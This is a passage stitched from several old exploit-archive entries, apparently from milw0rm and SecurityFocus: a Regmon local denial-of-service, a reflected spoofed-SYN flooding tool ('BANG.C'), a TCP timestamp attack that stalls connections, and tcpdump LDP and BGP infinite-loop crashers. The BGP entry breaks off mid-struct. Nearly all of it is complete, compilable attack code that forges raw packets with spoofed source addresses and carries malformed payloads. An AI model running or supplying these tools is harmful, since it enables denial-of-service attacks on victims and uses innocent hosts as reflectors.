         "  FUNCNAME - name of function to be checked\n");
  return;
}


int main(int argc,char **argv)
{
  about();

  if (argc!=2)
  {
    usage();
    return 1;
  }

  if (!stricmp(argv[1],"NtCreateMutant") || !stricmp(argv[1],"ZwCreateMutant"))
  {
    HANDLE handle;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa,(PVOID)1,0,NULL,NULL);

    ZwCreateMutant(&handle,0,&oa,FALSE);

  } else if (!stricmp(argv[1],"NtOpenEvent") || !stricmp(argv[1],"ZwOpenEvent"))
  {
    HANDLE handle;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa,(PVOID)1,0,NULL,NULL);

    ZwOpenEvent(&handle,0,&oa);
  } else printf("\nI do not know how to exploit the vulnerability using this function.\n");

  printf("\nTEST FAILED!\n");
  return 1;
}
source: http://www.securityfocus.com/bid/11042/info

Regmon is reported prone to a local denial of service vulnerability. This issue presents itself because the application fails to handle exceptional conditions and references unvalidated pointers to kernel functions.

Successful exploitation may allow a local unauthorized attacker to cause a denial of service condition in the application. The attacker may then obfuscate changes to the registry from the administrator and carry out further attacks against a vulnerable computer.

Regmon 6.11 for NT/9x and prior versions are reportedly affected by this issue. 

/*
 *  ntregmon-dos.c (up to 6.11)
 *
 *  Copyright (c) 2002-2004 By Next Generation Security S.L.
 *  All rights reserved
 *  http://www.ngsec.com
 *
 *  Compiles with: cl ntregmon-dos.c
 *
 *  Madrid, August 2004
 */

#include <windows.h>

#define MY_NULL 0x01
typedef DWORD (* zwsetvaluekey_TYPE)(DWORD KeyHandle, DWORD ValueName, DWORD TitleIndex, DWORD Type, DWORD Data, DWORD DataSize);


int main(int argc, char *argv[]) {
HINSTANCE dll;
zwsetvaluekey_TYPE my_ZwSetValueKey;

  if ((dll=LoadLibrary("ntdll.dll"))!=NULL) {

     if ((my_ZwSetValueKey=(zwsetvaluekey_TYPE)GetProcAddress(dll,"ZwSetValueKey"))!=NULL) {

         my_ZwSetValueKey(MY_NULL,MY_NULL,MY_NULL,MY_NULL,MY_NULL,MY_NULL);

     }
  }

}
/* 
 * BANG.C Coded by Sorcerer of DALnet
 *
 * FUCKZ to: etech, blazin, udp, hybrid and kdl
 * PROPZ : skrilla, thanks for all your help with JUNO-Z and especially this code :)
 *             -------------------------------- 
 * REDIRECTION DOS FINALLY DISTRIBUTED !!!!!!
 *
 * This is POC and demonstrates a new method of DoS. The idea
 * behind it is that the attacker generates connection requests
 * to a list of hosts which have a TCP service running such as
 * http (80), telnet (23) etc. from the ip of the victim host.
 * This will result all of the hosts that the victim *requested*
 * connections to send back packets (usually SYN-ACK's) 2-3 of
 * them (amplification comes here!) causing load to the victim
 * by cauzing the victim to send RST packets since it never actually
 * requested any such connection. This attack is dangerous since
 * its almost impossible to filter!!
 *
 * hosts file should be in the format of 1 ip:port per line
 * i.e. 194.66.25.97:80
 *      130.88.172.194:23
 *      65.161.42.42:6667
 * NOTE: target should only be ip, and all the hosts on the list should
 * also be ips thats for speed issues.
 * 
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>

#define __FAVOR_BSD

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>


unsigned short int getrandportid(void);
unsigned short in_cksum(u_short *addr, int len);
short int send_syn(unsigned long int , unsigned long int, unsigned short int);
int sox;

struct pseudo {
  unsigned long srca, dsta;
  unsigned char zero, proto;
  unsigned short tcplen;
};

struct checksum {
  struct pseudo pp;
  struct tcphdr tt;
};

/* Taken out since only works on x86 and rdtsc is also only pentium specific */
#if 0
/* Thanks to skrilla :) */
unsigned short mktcpsum1(struct packet *p,int len) {
  unsigned short old_sum = p->tcpsum;
  unsigned long s = (unsigned long)&p->sport;
  unsigned long sum = ((p->src >> 16) + (p->src & 0xffff) + (p->dst >> 16) +
		       (p->dst & 0xffff) + (__htons__(6) + __htons__(len-20)));
  
  p->tcpsum=0;
  __asm__ __volatile__ (
			/*"xorl %%eax,%%eax;"
			  "cmpl $2,%%ecx;"
			  "jb 1f;"
			  "0:;"
			  "lodsw;"
			  "addw %%ax,%%dx;"
			  "jnc 9f;"
			  "addl $65536,%%edx;"
			  "9:;"
			  "decl %%ecx;"
			  "loop 0b;"
			  "1:;"
			  "orb %%cl,%%cl;"
			  "jz 2f;"
			  "xorw %%ax,%%ax;"
			  "lodsb;"
			  "addw %%ax,%%dx;"
			  "jnz 2f;"
			  "addl $65536,%%edx;"
			  "2:;"
			  "movw %%dx,%%ax;"
			  "shrl $16,%%edx;"
			  "addw %%ax,%%dx;"
			  "adcl $0xffff0000,%%edx;"
			  "xorw $65535,%%dx;"*/
			
			"movw %%dx,%%ax;"
			"shrl $16,%%edx;"
			"addw %%ax,%%dx;"
			"adcw $0,%%dx;"
			
			"testl $1,%%ecx;"
			"jz 0f;"
			"xorw %%ax,%%ax;"
			"lodsb;"
			"addw %%ax,%%dx;"
			"adcw $0,%%dx;"
			"0:;"
			"shrl $1,%%ecx;"
			"1:;"
			"lodsw;"
			"addw %%ax,%%dx;"
			"adcw $0,%%dx;"
			"loop 1b;"
			"andl $65535,%%edx;"
			"xorw $65535,%%dx;"
			
			:"=edx"(sum):"edx"(sum),"ecx"(len-20),"S"(&p->sport):"eax");
  p->tcpsum=old_sum;
  return(sum);
}

unsigned long long int
rdtsc(void) {
  unsigned long long int tsc;
  unsigned long int tsc_l,tsc_h;
  __asm__ volatile("rdtsc":"=%eax"(tsc_l),"=d"(tsc_h));
  tsc=tsc_h;
  tsc=(tsc<<32)|tsc_l;
  return(tsc);
}
#endif

int
main(int argc, char **argv)
{
  int                 enable=1,tmp,tmp2, loop, count=0;
  char               *lala, *tmp1, buf[25];
  unsigned long int   ip[1000000], src;
  unsigned short int  port[1000000];
  FILE               *fp;
  struct timeval      start, end;

  printf("\nCoded by Sorcerer of DALnet\n\n");
  
  if(argc != 4){
    fprintf(stderr, "Incorrect usage try: %s <victim> <host-file> <loop host-file>\a\n", *argv);
    fprintf(stderr, "Example:             %s 127.0.0.1 myhostsfile.txt 3\n\n", *argv);
    return(-1);
  }
  
  fp = fopen(argv[2], "r");
  if(fp == NULL){
    fprintf(stderr, "Error while opening: %s\n", argv[2]);
    perror("fopen");
    return(-1);
  }
  
  loop = atoi(argv[3]);
  if(loop == 0){
    fprintf(stderr, "Cannot loop 0 times you need to loop at least once\n");
    return(-1);
  }
  
  for(tmp=0;tmp<=1000000;tmp++){
    ip[tmp] = htons(23);
    port[tmp] = htons(23);
  }

  sox = socket(PF_INET, SOCK_RAW, 6);
  if(sox == -1){ perror("socket"); return(-1); }
  
  tmp = setsockopt(sox, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
  if(tmp == -1){ perror("setsockopt"); return(-1); }

    
  printf("Reading ips on memory and reconstructing in network byte order...\n"); fflush(stdout);
  
  while(1){
    memset(buf, 0, 25);

    tmp1 = fgets(buf, 25, fp);
    if(tmp1 == NULL) break;
    
    if(strlen(buf) < 9) {
      printf("Bogus entry: %s\n", buf);
      continue;
    }
    
    lala = strchr((char *)&buf, ':');

    port[count] = htons(atoi(++lala));

    buf[strlen(buf)-strlen(lala)-1] = '\0';

    ip[count] = inet_addr(buf);

    count++;
    printf("."); fflush(stdout);
  }

  printf("Done.\n");

  src = inet_addr(argv[1]);

  tmp = gettimeofday((struct timeval *)&start, NULL);
  if(tmp == -1){ perror("gettimeofday"); return(-1); }
  

  for(tmp2=0;tmp2<loop;tmp2++)
    for(tmp=0;tmp<count;tmp++)
      send_syn(src, ip[tmp], port[tmp]);
  

  tmp = gettimeofday((struct timeval *)&end, NULL);
  if(tmp == -1){ perror("gettimeofday"); return(-1); }
  
  printf("\nTotal time taken: %lu\nBytes sent: %d\n", (end.tv_sec+end.tv_usec)-(start.tv_sec+start.tv_usec), count*loop*sizeof(char)*sizeof(struct ip)*sizeof(struct tcphdr));
  
  return 0;
}

short int
send_syn(unsigned long int src, unsigned long int dst, unsigned short int port)
{
  struct sockaddr_in  s;
  struct ip           *i;
  struct tcphdr       *t;
  struct pseudo       p;
  struct checksum     c;
  char                packet[sizeof(char)*(sizeof(struct ip)+sizeof(struct tcphdr))];
  int                 tmp;

  s.sin_family       = PF_INET;
  s.sin_port         = port;
  s.sin_addr.s_addr  = dst;
 
  i = (struct ip *)&packet;
  t = (struct tcphdr *)((int)i+sizeof(struct ip));

  memset(&packet, 0, sizeof(packet));

  i->ip_hl         = 5;
  i->ip_v          = 4;
  i->ip_tos        = 0x08;
  i->ip_len        = htons(sizeof(packet));
  i->ip_id         = htons(getrandportid());
  i->ip_off        = 0;
  i->ip_ttl        = 255;
  i->ip_p          = 6;
  i->ip_sum        = 0;
  i->ip_src.s_addr = src;
  i->ip_dst.s_addr = dst;


  t->th_sport = htons(getrandportid());
  t->th_dport = port;
  t->th_seq   = htons(getrandportid());
  t->th_ack   = 0;
  t->th_x2    = 0;
  t->th_off   = 5;
  t->th_flags = 0x02;
  t->th_win   = 65535;
  t->th_urp   = 0;
  t->th_sum   = 0;

  p.srca      = src;
  p.dsta      = dst;
  p.proto     = 6;
  p.tcplen    = htons(sizeof(struct tcphdr));
  p.zero      = 0;
  
  memcpy(&c.pp, &p, sizeof(p));
  memcpy(&c.tt, t, sizeof(struct tcphdr));

  t->th_sum    = in_cksum((void *)&c, sizeof(c));

  tmp = sendto(sox, packet, ntohs(i->ip_len), MSG_DONTWAIT, (struct sockaddr *)&s, sizeof(s));
  if(tmp == -1){
    perror("sendto");
    return(-1);
  }

  return 0;
}

unsigned short int
getrandportid(void)
{
  unsigned short int port;
  struct timeval tv;

  gettimeofday((struct timeval *)&tv, NULL);
  srand(tv.tv_sec+tv.tv_usec);

  port = rand()+1;

  return(port);
}


/* Slow shit checksum function from RFC */
u_short 
in_cksum(u_short *addr, int len)
{
  register int nleft = len;
  register u_short *w = addr;
  register int sum = 0;
  u_short answer = 0;
  
  while (nleft > 1)  {
    sum += *w++;
    nleft -= 2;
  }
  
  
  if (nleft == 1) {
    *(u_char *)(&answer) = *(u_char *) w;
    sum += answer;
  }
  
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return(answer);
}

// milw0rm.com [2002-09-17]
/*
* TCP does not adequately validate segments before updating timestamp value
* http://www.kb.cert.org/vuls/id/637934
*
* RFC-1323 (TCP Extensions for High Performance)
*
* 4.2.1 defines how the PAWS algorithm should drop packets with invalid
* timestamp options:
* 
* R1) If there is a Timestamps option in the arriving segment
* and SEG.TSval < TS.Recent and if TS.Recent is valid (see
* later discussion), then treat the arriving segment as not
* acceptable:
*
* Send an acknowledgement in reply as specified in
* RFC-793 page 69 and drop the segment.
*
* 3.4 defines what timestamp options to accept:
*
* (2) If Last.ACK.sent falls within the range of sequence numbers
* of an incoming segment:
*
* SEG.SEQ <= Last.ACK.sent < SEG.SEQ + SEG.LEN
*
* then the TSval from the segment is copied to TS.Recent;
* otherwise, the TSval is ignored.
*
* http://community.roxen.com/developers/idocs/drafts/
* draft-jacobson-tsvwg-1323bis-00.html
*
* 3.4 suggests an slightly different check like
*
* (2) If: SEG.TSval >= TSrecent and SEG.SEQ <= Last.ACK.sent
* then SEG.TSval is copied to TS.Recent; otherwise, it is
* ignored.
*
* and explains this change
*
* APPENDIX C: CHANGES FROM RFC-1072, RFC-1185, RFC-1323
*
* There are additional changes in this document from RFC-1323.
* These changes are:
* (b) In RFC-1323, section 3.4, step (2) of the algorithm to control
* which timestamp is echoed was incorrect in two regards:
* (1) It failed to update TSrecent for a retransmitted segment
* that resulted from a lost ACK.
* (2) It failed if SEG.LEN = 0.
* In the new algorithm, the case of SEG.TSval = TSrecent is
* included for consistency with the PAWS test.
*
* At least OpenBSD and FreeBSD contain this code instead:
*
* sys/netinet/tcp_input.c tcp_input()
*
* **
* * If last ACK falls within this segment's sequence numbers,
* * record its timestamp.
* * NOTE that the test is modified according to the latest
* * proposal of the tcplw@cray.com list (Braden 1993/04/26).
* **
* if ((to.to_flags & TOF_TS) != 0 &&
* SEQ_LEQ(th->th_seq, tp->last_ack_sent)) {
* tp->ts_recent_age = ticks;
* tp->ts_recent = to.to_tsval;
* }
*
* The problem here is that the packet the timestamp is accepted from doesn't
* need to have a valid th_seq or th_ack. This point of execution is reached
* for packets with arbitrary th_ack values and th_seq values of half the
* possible value range, because the first 'if (todrop > tlen)' check in the
* function explicitely continues execution to process ACKs.
*
* If an attacker knows (or guesses) the source and destination addresses and
* ports of a connection between two peers, he can send spoofed TCP packets
* to either peer containing bogus timestamp options. Since half of the
* possible th_seq and timestamp values are accepted, four packets containing
* two random values and their integer wraparound opposites are sufficient to
* get one random timestamp accepted by the receipient. Further packets from
* the real peer will get dropped by PAWS, and the TCP connection stalls and
* times out.
*
* The following change reverts the tcp_input() check back to the implemented
* suggested by draft-jacobson-tsvwg-1323bis-00.txt
*
* if (opti.ts_present && TSTMP_GEQ(opti.ts_val, tp->ts_recent) &&
* SEQ_LEQ(th->th_seq, tp->last_ack_sent)) {
* + if (SEQ_LEQ(tp->last_ack_sent, th->th_seq + tlen +
* + ((tiflags & (TH_SYN|TH_FIN)) != 0)))
* + tp->ts_recent = opti.ts_val;
* + else
* + tp->ts_recent = 0;
* tp->ts_recent_age = tcp_now;
* - tp->ts_recent = opti.ts_val;
* }
*
* I can't find Braden's proposal referenced in the comment. It seems to
* pre-date draft-jacobson-tsvwg-1323bis-00.txt and might be outdated by
* it.
*
* Fri Mar 11 02:33:36 MET 2005 Daniel Hartmeier <daniel@benzedrine.cx>
*
* http://www.openbsd.org/cgi-bin/cvsweb/src/sys/netinet/tcp_input.c.diff\
* ?r1=1.184&r2=1.185&f=h
*
* http://www.freebsd.org/cgi/cvsweb.cgi/src/sys/netinet/tcp_input.c.diff\
* ?r1=1.252.2.15&r2=1.252.2.16&f=h
*
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <net/if.h>
#ifdef __FreeBSD__
#include <net/if_var.h>
#endif
#include <netinet/in.h>
#include <netinet/in_var.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

static u_int16_t
checksum(u_int16_t *data, u_int16_t length)
{
u_int32_t value = 0;
u_int16_t i;

for (i = 0; i < (length >> 1); ++i)
value += data[i];
if ((length & 1) == 1)
value += (data[i] << 8);
value = (value & 65535) + (value >> 16);
return (~value);
}

static int
send_tcp(int sock, u_int32_t saddr, u_int32_t daddr, u_int16_t sport,
u_int16_t dport, u_int32_t seq, u_int32_t ts)
{
u_char packet[1600];
struct tcphdr *tcp;
struct ip *ip;
unsigned char *opt;
int optlen, len, r;
struct sockaddr_in sin;

memset(packet, 0, sizeof(packet));

opt = packet + sizeof(struct ip) + sizeof(struct tcphdr);
optlen = 0;
opt[optlen++] = TCPOPT_NOP;
opt[optlen++] = TCPOPT_NOP;
opt[optlen++] = TCPOPT_TIMESTAMP;
opt[optlen++] = 10;
ts = htonl(ts);
memcpy(opt + optlen, &ts, sizeof(ts));
optlen += sizeof(ts);
ts = htonl(0);
memcpy(opt + optlen, &ts, sizeof(ts));
optlen += sizeof(ts);

len = sizeof(struct ip) + sizeof(struct tcphdr) + optlen;

ip = (struct ip *)packet;
ip->ip_src.s_addr = saddr;
ip->ip_dst.s_addr = daddr;
ip->ip_p = IPPROTO_TCP;
ip->ip_len = htons(sizeof(struct tcphdr) + optlen);

tcp = (struct tcphdr *)(packet + sizeof(struct ip));
tcp->th_sport = htons(sport);
tcp->th_dport = htons(dport);
tcp->th_seq = htonl(seq);
tcp->th_ack = 0;
tcp->th_off = (sizeof(struct tcphdr) + optlen) / 4;
tcp->th_flags = 0;
tcp->th_win = htons(16384);
tcp->th_sum = 0;
tcp->th_urp = 0;

tcp->th_sum = checksum((u_int16_t *)ip, len);

ip->ip_v = 4;
ip->ip_hl = 5;
ip->ip_tos = 0;
ip->ip_len = htons(len);
ip->ip_id = htons(arc4random() % 65536);
ip->ip_off = 0;
ip->ip_ttl = 64;

sin.sin_family = AF_INET;
sin.sin_addr.s_addr = saddr;

r = sendto(sock, packet, len, 0, (struct sockaddr *)&sin, sizeof(sin));
if (r != len) {
perror("sendto");
return (1);
}

return (0);
}

static u_int32_t
op(u_int32_t u)
{
return (u_int32_t)(((u_int64_t)u + 2147483648UL) % 4294967296ULL);
}

int main(int argc, char *argv[])
{
u_int32_t saddr, daddr, seq, ts;
u_int16_t sport, dport;
int sock, i;

if (argc != 5) {
fprintf(stderr, "usage: %s <src ip> <src port> "
"<dst ip> <dst port>\n", argv[0]);
return (1);
}

saddr = inet_addr(argv[1]);
daddr = inet_addr(argv[3]);
sport = atoi(argv[2]);
dport = atoi(argv[4]);

sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
if (sock < 0) {
perror("socket");
return (1);
}
i = 1;
if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1) {
perror("setsockopt");
close(sock);
return (1);
}

seq = arc4random();
ts = arc4random();
if (send_tcp(sock, saddr, daddr, sport, dport, seq, ts) ||
send_tcp(sock, saddr, daddr, sport, dport, seq, op(ts)) ||
send_tcp(sock, saddr, daddr, sport, dport, op(seq), ts) ||
send_tcp(sock, saddr, daddr, sport, dport, op(seq), op(ts))) {
fprintf(stderr, "failed\n");
close(sock);
return (1);
}

close(sock);
printf("done\n");
return (0);
}

// milw0rm.com [2005-05-21]
/*[ tcpdump[3.8.x]: (LDP) ldp_print() infinite loop DOS. ]********* 
 *                                                                *
 * by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)               *
 *                                                                *
 * compile:                                                       *
 *  gcc xtcpdump-ldp-dos.c -o xtcpdump-ldp-dos                    *
 *                                                                *
 * tcpdump homepage/URL:                                          *
 *  http://www.tcpdump.org                                        *
 *                                                                *
 * fix:                                                           *
 *  this appears to have been fixed in the alpha 3.9.x / CVS      *
 *  versions.  although i found no direct mention of the issue    *
 *  itself being resolved, the code has been changed in a way to  *
 *  not allow this to happen.                                     *
 *                                                                *
 * Tcpdump is a program that allows you to dump the traffic on a  *
 * network. It can be used to print out the headers of packets on *
 * a network interface that matches a given expression. You can   *
 * use this tool to track down network problems, to detect "ping  *
 * attacks" or to monitor the network activities.                 *
 *                                                                *
 * tcpdump(v3.8.3 and earlier versions) contains a remote denial  *
 * of service vulnerability in the form of a single (LDP) packet  *
 * causing an infinite loop.                                      *
 *                                                                *
 * LDP is UDP(/TCP), so no LDP service has to actually be running *
 * to abuse this issue, spoofed or not spoofed.  depending on the *
 * path the packet takes spoofed packets may be dropped(dropped   *
 * at your router most likely), in such a case non-spoofed        *
 * packets have the same effect, they just show your ip.          *
 *                                                                *
 * some versions of tcpdump(depending on the platform/OS) need no *
 * special command-line arguments to allow this to happen,        *
 * however most need the "-v" argument.                           *
 ******************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#ifdef _USE_ARPA
#include <arpa/inet.h>
#endif

/* doesn't seem to be standardized, so... */
#if defined(__BYTE_ORDER) && !defined(BYTE_ORDER)
#define BYTE_ORDER __BYTE_ORDER
#endif
#if defined(__BIG_ENDIAN) && !defined(BIG_ENDIAN)
#define BIG_ENDIAN __BIG_ENDIAN
#endif
#if defined(BYTE_ORDER) && defined(BIG_ENDIAN)
#if BYTE_ORDER == BIG_ENDIAN
#define _USE_BIG_ENDIAN
#endif
#endif

/* will never need to be changed. */
#define LDP_PORT 646
#define DFL_AMOUNT 5
#define TIMEOUT 10

/* avoid platform-specific header madness. */
/* (just plucked out of header files) */
struct iph{
#ifdef _USE_BIG_ENDIAN
 unsigned char version:4,ihl:4;
#else
 unsigned char ihl:4,version:4;
#endif
 unsigned char tos;
 unsigned short tot_len;
 unsigned short id;
 unsigned short frag_off;
 unsigned char ttl;
 unsigned char protocol;
 unsigned short check;
 unsigned int saddr;
 unsigned int daddr;
};
struct udph{
  unsigned short source;
  unsigned short dest;
  unsigned short len;
  unsigned short check;
};
struct sumh{
  unsigned int saddr;
  unsigned int daddr;
  unsigned char fill;
  unsigned char protocol;
  unsigned short len;
};

/* malformed LDP data. (the bug) */
static char payload[]=
 "\x00\x01\xff\xff\xff\xff\xff\xff\xff"
 "\xff\xff\xff\x00\x00\xff\xff\xff\xff";

/* prototypes. (and sig_alarm) */
void ldp_nospoof(unsigned int);
void ldp_spoof(unsigned int,unsigned int);
unsigned short in_cksum(unsigned short *,signed int);
unsigned int getip(char *);
void printe(char *,signed char);
void sig_alarm(){printe("alarm/timeout hit.",1);}

/* begin. */
int main(int argc,char **argv) {
 unsigned char nospoof=0;
 unsigned int amt=DFL_AMOUNT;
 unsigned int daddr=0,saddr=0;
 printf("[*] tcpdump[3.8.x]: (LDP) ldp_print() infinite loop DOS."
 "\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n");
 if(argc<2){
  printf("[*] syntax: %s <dst host> [src host(0=random)] [amount]\n",
  argv[0]);
  printf("[*] syntax: %s <dst host> nospoof\n",argv[0]);
  exit(1);
 }
 if(!(daddr=getip(argv[1])))
  printe("invalid destination host/ip.",1);
 if(argc>2){
  if(strstr(argv[2],"nospoof"))nospoof=1;
  else saddr=getip(argv[2]);
 }
 if(argc>3)amt=atoi(argv[3]);
 if(!amt)printe("no packets?",1);
 printf("[*] destination\t: %s\n",argv[1]);
 if(!nospoof)
  printf("[*] source\t: %s\n",(saddr?argv[2]:"<random>"));
 printf("[*] amount\t: %u\n\n",amt);
 printf("[+] sending(packet = .): ");
 fflush(stdout);
 while(amt--){
  /* spice things up. */
  srandom(time(0)+amt);
  if(nospoof)ldp_nospoof(daddr);
  else ldp_spoof(daddr,saddr);
  printf(".");
  fflush(stdout);
  usleep(50000);
 }
 printf("\n\n[*] done.\n");
 fflush(stdout);
 exit(0);
}
/* (non-spoofed) sends a (LDP) udp packet. */
void ldp_nospoof(unsigned int daddr){
 signed int sock;
 struct sockaddr_in sa;
 sock=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
 sa.sin_family=AF_INET;
 sa.sin_port=htons(LDP_PORT);
 sa.sin_addr.s_addr=daddr;
 if(sendto(sock,payload,sizeof(payload)-1,0,(struct sockaddr *)&sa,
 sizeof(struct sockaddr))<sizeof(payload)-1)
  printe("failed to send non-spoofed LDP packet.",1);
 close(sock);
 return;
}
/* (spoofed) generates and sends a (LDP) udp packet. */
void ldp_spoof(unsigned int daddr,unsigned int saddr){
 signed int sock=0,on=1;
 unsigned int psize=0;
 char *p,*s;
 struct sockaddr_in sa;
 struct iph ip;
 struct udph udp;
 struct sumh sum;
 /* create raw (UDP) socket. */
 if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_UDP))<0)
  printe("could not allocate raw socket.",1);
 /* allow (on some systems) for the user-supplied ip header. */
#ifdef IP_HDRINCL
 if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)))
  printe("could not set IP_HDRINCL socket option.",1);
#endif
 sa.sin_family=AF_INET;
 sa.sin_port=htons(LDP_PORT);
 sa.sin_addr.s_addr=daddr;
 psize=(sizeof(struct iph)+sizeof(struct udph)+sizeof(payload)-1);
 memset(&ip,0,sizeof(struct iph));
 memset(&udp,0,sizeof(struct udph));
 /* values not filled = 0, from the memset() above. */
 ip.ihl=5;
 ip.version=4;
 ip.tot_len=htons(psize);
 ip.saddr=(saddr?saddr:random()%0xffffffff);
 ip.daddr=daddr;
 ip.ttl=(64*(random()%2+1));
 ip.protocol=IPPROTO_UDP;
 ip.frag_off=64;
 udp.source=htons(random()%60000+1025);
 udp.dest=htons(LDP_PORT);
 udp.len=htons(sizeof(struct udph)+sizeof(payload)-1);
 /* needed for (correct) checksums. */
 sum.saddr=ip.saddr;
 sum.daddr=ip.daddr;
 sum.fill=0;
 sum.protocol=ip.protocol;
 sum.len=htons(sizeof(struct udph)+sizeof(payload)-1);
 /* make sum/calc buffer for the udp checksum. (correct) */
 if(!(s=(char *)malloc(sizeof(struct sumh)+sizeof(struct udph)
 +sizeof(payload)+1)))
  printe("malloc() failed.",1);
 memset(s,0,(sizeof(struct sumh)+sizeof(struct udph)
 +sizeof(payload)+1));
 memcpy(s,&sum,sizeof(struct sumh));
 memcpy(s+sizeof(struct sumh),&udp,sizeof(struct udph));
 memcpy(s+sizeof(struct sumh)+sizeof(struct udph),
 payload,sizeof(payload)-1);
 udp.check=in_cksum((unsigned short *)s,
 sizeof(struct sumh)+sizeof(struct udph)+sizeof(payload)-1);
 free(s);
 /* make sum/calc buffer for the ip checksum. (correct) */
 if(!(s=(char *)malloc(sizeof(struct iph)+1)))
  printe("malloc() failed.",1);
 memset(s,0,(sizeof(struct iph)+1));
 memcpy(s,&ip,sizeof(struct iph));
 ip.check=in_cksum((unsigned short *)s,sizeof(struct iph));
 free(s);
 /* put the packet together. */
 if(!(p=(char *)malloc(psize+1)))
  printe("malloc() failed.",1);
 memset(p,0,psize);
 memcpy(p,&ip,sizeof(struct iph));
 memcpy(p+sizeof(struct iph),&udp,sizeof(struct udph));
 memcpy(p+(sizeof(struct iph)+sizeof(struct udph)),
 payload,sizeof(payload));
 /* send the malformed LDP packet. */
 if(sendto(sock,p,psize,0,(struct sockaddr *)&sa,
 sizeof(struct sockaddr))<psize)
  printe("failed to send forged LDP packet.",1);
 free(p);
 return;
}
/* standard method for creating TCP/IP checksums. */
unsigned short in_cksum(unsigned short *addr,signed int len){
 unsigned short answer=0;
 register unsigned short *w=addr;
 register int nleft=len,sum=0;
 while(nleft>1){
  sum+=*w++;
  nleft-=2;
 }
 if(nleft==1){
  *(unsigned char *)(&answer)=*(unsigned char *)w;
  sum+=answer;
 }
 sum=(sum>>16)+(sum&0xffff);
 sum+=(sum>>16);
 answer=~sum;
 return(answer);
}
/* gets the ip from a host/ip/numeric. */
unsigned int getip(char *host){
 struct hostent *t;
 unsigned int s=0;
 if((s=inet_addr(host))){
  if((t=gethostbyname(host)))
   memcpy((char *)&s,(char *)t->h_addr,sizeof(s));
 }
 if(s==-1)s=0;
 return(s);
}
/* all-purpose error/exit function. */
void printe(char *err,signed char e){
 printf("[!] %s\n",err);
 if(e)exit(e);
 return;
}

// milw0rm.com [2005-04-26]
/*[ tcpdump[3.8.x]: (BGP) RT_ROUTING_INFO infinite loop DOS. ]***** 
 *                                                                *
 * by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)               *
 *                                                                *
 * compile:                                                       *
 *  gcc xtcpdump-bgp-dos.c -o xtcpdump-bgp-dos                    *
 *  gcc xtcpdump-bgp-dos.c -o xtcpdump-bgp-dos -D_USE_SYN         *
 *                                                                *
 * tcpdump homepage/URL:                                          *
 *  http://www.tcpdump.org                                        *
 *                                                                *
 * fix:                                                           *
 *  this appears to have been fixed in the alpha 3.9.x / CVS      *
 *  versions.  although i found no direct mention of the issue    *
 *  itself being resolved, the code has been changed in a way to  *
 *  not allow this to happen.                                     *
 *                                                                *
 * Tcpdump is a program that allows you to dump the traffic on a  *
 * network. It can be used to print out the headers of packets on *
 * a network interface that matches a given expression. You can   *
 * use this tool to track down network problems, to detect "ping  *
 * attacks" or to monitor the network activities.                 *
 *                                                                *
 * tcpdump(v3.8.3 and earlier versions) contains a remote denial  *
 * of service vulnerability in the form of a single (BGP) packet  *
 * causing an infinite loop.                                      *
 *                                                                *
 * BGP is TCP, however the victim does not have to have the BGP   *
 * port(179) open to abuse the bug.  by sending a specially       *
 * crafted (spoofed) TCP(ACK,PUSH) packet to port 179 you can     *
 * trigger the infinite loop, however it depends on if the packet *
 * can make it out without being dropped.  in some situations the *
 * source host/ip used must be within your local subnet(or your   *
 * actual ip) for the (spoofed) packet to make it past your own   *
 * router.  if for some reason you think a (invalid) TCP(SYN)     *
 * packet is more likely to make it out, compile with the         *
 * -D_USE_SYN flag. (tcpdump will parse the BGP data even if it   *
 * is a TCP(SYN) packet)                                          *
 *                                                                *
 * some versions of tcpdump(depending on the platform/OS) need no *
 * special command-line arguments to allow this to happen.        *
 * however most need the "-v" argument, and a some need the       *
 * "-s" (snaplen) set to 88(non-spoofed is around 100, with the   *
 * ip options) or more.                                           *
 ******************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#ifdef _USE_ARPA
#include <arpa/inet.h>
#endif

/* doesn't seem to be standardized, so... */
#if defined(__BYTE_ORDER) && !defined(BYTE_ORDER)
#define BYTE_ORDER __BYTE_ORDER
#endif
#if defined(__BIG_ENDIAN) && !defined(BIG_ENDIAN)
#define BIG_ENDIAN __BIG_ENDIAN
#endif
#if defined(BYTE_ORDER) && defined(BIG_ENDIAN)
#if BYTE_ORDER == BIG_ENDIAN
#define _USE_BIG_ENDIAN
#endif
#endif

/* will never need to be changed. */
#define BGP_PORT 179
#define DFL_AMOUNT 5
#define TIMEOUT 10

/* avoid platform-specific header madness. */
/* (just plucked out of header files) */
struct iph{
#ifdef _USE_BIG_ENDIAN
 unsigned char version:4,ihl:4;
#else
 unsigned char ihl:4,version:4;
#endif
 unsigned char tos;
 unsigned short tot_len;
 unsigned short id;
 unsigned short frag_off;
 unsigned char ttl;
 unsigned char protocol;
 unsigned short check;
 unsigned int saddr;
 unsigned int daddr;
};
struct tcph{
 unsigned short source;
 unsigned short dest;
 unsigned int seq;
 unsigned int ack_seq;
#ifdef _USE_BIG_ENDIAN
 unsigned short doff:4,res1:4,cwr:1,ece:1,
 urg:1,ack:1,psh:1,rst:1,syn:1,fin:1;
#else
